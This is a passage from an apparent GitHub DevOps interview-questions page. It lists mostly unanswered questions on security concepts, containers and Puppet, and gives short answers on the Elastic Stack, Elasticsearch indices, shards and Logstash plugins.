&lt;h4&gt;&lt;a id="user-content-baby-beginner-25" class="anchor" aria-hidden="true" href="#baby-beginner-25"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Can you describe the DevSecOps core principals?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What DevOps security best practices are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What security techniques are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Authentication and Authorization&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Authentication is the process of identifying whether a service or a person is who they claim to be.
Authorization is the process of identifying what level of access the service or the person have (after authentication was done)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you manage passwords in different tools and platforms?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Single Sign-On&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain MFA (Multi-Factor Authentication)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain RBAC (Role-based Access Control)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Symmetric encryption&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Asymmetric encryption&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain RBAC (Role-based Access Control)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following:
&lt;ul&gt;
&lt;li&gt;Vulnerability&lt;/li&gt;
&lt;li&gt;Exploits&lt;/li&gt;
&lt;li&gt;Risk&lt;/li&gt;
&lt;li&gt;Threat&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is XSS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an SQL injection? How to manage it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Certification Authority?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you identify and manage vulnerabilities?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Privilege Restriction"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How HTTPS is different from HTTP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of firewalls are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is DDoS attack? How do you deal with it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between asynchronous and synchronous encryption?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Man-in-the-middle attack&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain CVE and CVSS&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is ARP Poisoning?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe how do you secure public repositories&lt;/summary&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do cookies work?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is DNS Spoofing? How to prevent it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What can you tell me about Stuxnet?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What can you tell me about Spectre?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain OAuth&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Format String Vulnerability"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Buffer Overflow"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain DMZ&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain TLS&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is CSRF? How to handle CSRF?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain HTTP Header Injection vulnerability&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What security sources are you using to keep updated on latest news?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What TCP and UDP vulnerabilities are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do using VLANs contribute to network security?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are some examples of security architecture requirements?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is air-gapped network (or air-gapped environment)? What its advantages and disadvantages?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Buffer Overflow&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-containers" class="anchor" aria-hidden="true" href="#containers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Containers&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What security measures are you taking when dealing with containers?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Docker Bench&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-security-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-advanced-1" class="anchor" aria-hidden="true" href="#baby-advanced-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain MAC flooding attack&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is "Diffie-Hellman key exchange" and how does it work?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Forward Secrecy"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Cache Poisoned Denial of Service?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-puppet" class="anchor" aria-hidden="true" href="#puppet"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Puppet&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-puppet-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-26" class="anchor" aria-hidden="true" href="#baby-beginner-26"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Puppet? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Puppet architecture&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you compare Puppet to other configuration management tools? Why did you chose to use Puppet?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following:
&lt;ul&gt;
&lt;li&gt;Module&lt;/li&gt;
&lt;li&gt;Manifest&lt;/li&gt;
&lt;li&gt;Node&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain Facter&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is MCollective?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-puppet-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-advanced-2" class="anchor" aria-hidden="true" href="#baby-advanced-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with writing modules? Which module have you created and for what?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Hiera&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-elastic" class="anchor" aria-hidden="true" href="#elastic"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Elastic&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-elastic-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-27" class="anchor" aria-hidden="true" href="#baby-beginner-27"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is the Elastic Stack?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The Elastic Stack consists of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Elasticsearch&lt;/li&gt;
&lt;li&gt;Elastic Hadoop&lt;/li&gt;
&lt;li&gt;Kibana&lt;/li&gt;
&lt;li&gt;Logstash&lt;/li&gt;
&lt;li&gt;Beats&lt;/li&gt;
&lt;li&gt;APM Server&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The most used projects are the Elasticserach, Logstash and Kibana. Also known as the ELK stack.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Describe what happens from the moment the app logged some information until it's displayed to the user in the dashboard when the Elastic stack is used&lt;/summary&gt;&lt;br&gt;&lt;b&gt;  
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;The data logged by the application is sent to Elasticsearch&lt;/li&gt;
&lt;li&gt;Elasticsearch stores the document it got and the document is indexed for quick future access&lt;/li&gt;
&lt;li&gt;Logstash processes the data&lt;/li&gt;
&lt;li&gt;The user creates visualizations which uses the index in elasticsearch and more specifically the data there (this is done in Kibana).&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;The user creates a dashboard which composed out of the visualization created earlier
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;h5&gt;&lt;a id="user-content-elasticsearch" class="anchor" aria-hidden="true" href="#elasticsearch"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Elasticsearch&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Elasticsearch&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;From the official &lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/documents-indices.html" rel="nofollow"&gt;docs&lt;/a&gt;:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"Elasticsearch is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an Index?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Index in Elastic is in most cases compared to a whole database from the SQL/NoSQL world.&lt;br&gt;
You can choose to have one index to hold all the data of your app or have multiple indices where each index holds different type of your app (e.g. index for each service your app is running).&lt;/p&gt;
&lt;p&gt;The official docs also offer a great explanation (in general, it's really good documentation, as every project should have):&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"An index can be thought of as an optimized collection of documents and each document is a collection of fields, which are the key-value pairs that contain your data"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an Inverted Index?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;From the official docs:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"An inverted index lists every unique word that appears in any document and identifies all of the documents each word occurs in."
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a Document?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Continuing with the comparison to SQL/NoSQL a Document in Elastic is a row in table in the case of SQL or a document in a collection in the case of NoSQL.
As in NoSQL a Document is a JSON object which holds data on a unit in your app. What is this unit depends on the your app. If your app related to book then each document describes a book. If you are app is about shirts then each document is a shirt.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? Elasticsearch indexes all data in every field and each indexed field has the same data structure for unified and quick query ability&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;False.&lt;/p&gt;
&lt;p&gt;From the official docs:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"Each indexed field has a dedicated, optimized data structure. For example, text fields are stored in inverted indices, and numeric and geo fields are stored in BKD trees."
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What reserved fields a document has?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;_index&lt;/li&gt;
&lt;li&gt;_id&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;_type
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain Mapping&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the advantages of defining your own mapping? (or: when would you use your own mapping?)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;You can optimize fields for partial matching&lt;/li&gt;
&lt;li&gt;You can define custom formats of known fields (e.g. date)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;You can perform language-specific analysis
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain Shards&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;An index is split into shards and documents are hashed to a particular shard. Each shard may be on a different node in a cluster and each one of the shards is a self contained index.&lt;br&gt;
This allows Elasticsearch to scale to an entire cluster of servers.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain Replicas&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you explain Term Frequency &amp;amp; Document Frequency?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Term Frequency is how often a term appears in a given document and Document Frequency is how often a term appears in all documents. They both are used for determining the relevance of a term by calculating Term Frequency / Document Frequency.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-query-dsl" class="anchor" aria-hidden="true" href="#query-dsl"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Query DSL&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Explain Elasticsearch query syntax (Booleans, Fields, Ranges)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Relevance Score&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Query Context and Filter Context&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;From the official docs:&lt;/p&gt;
&lt;p&gt;"In the query context, a query clause answers the question “How well does this document match this query clause?” Besides deciding whether or not the document matches, the query clause also calculates a relevance score in the _score meta-field."&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"In a filter context, a query clause answers the question “Does this document match this query clause?” The answer is a simple Yes or No — no scores are calculated. Filter context is mostly used for filtering structured data"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-logstash" class="anchor" aria-hidden="true" href="#logstash"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Logstash&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What are Logstash plugins? What plugins types are there?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Input Plugins - how to collect data from different sources&lt;/li&gt;
&lt;li&gt;Filter Plugins - processing data&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Output Plugins - push data to different outputs/services/platforms
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are Logstash Codecs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
